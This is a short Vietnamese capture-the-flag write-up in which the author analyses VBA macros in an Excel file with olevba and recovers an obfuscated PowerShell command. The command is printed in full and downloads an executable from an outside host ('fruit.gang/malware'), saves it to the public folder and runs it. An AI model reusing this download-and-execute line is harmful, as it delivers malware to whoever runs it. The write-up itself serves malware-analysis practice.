### Đề bài

![image](https://github.com/Eafz/demo/assets/55439965/09891fe6-ef33-45ff-858a-9b70ed29bbc9)

Để bài đại loại kiểu là mình sẽ nhận được một file excel và phân tích nó để lấy tên tệp tải xuống(flag có dạng utctf{tên tệp}). Thông thường các dạng như này thì sẽ thực hiện phân tích VBA macros trong file excel

Kiểm tra file với olevba thu được thông tin như hình dưới

![image](https://github.com/Eafz/demo/assets/55439965/a44e1d59-593d-463b-a567-342e7ff56c08)

Chúng ta có thể thấy về cơ bản là sẽ thực thi một đoạn Powershell script được đặt trong biến `f`. Với biến f được làm rối nội dung bằng phương pháp chia nhỏ và cộng các chuỗi con lại với nhau

Thực hiện xem nội dung đoạn powershell được thực thi thu được

![image](https://github.com/Eafz/demo/assets/55439965/35035ba2-13d7-4a26-b8a1-d088d3a27273)

`poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}"`
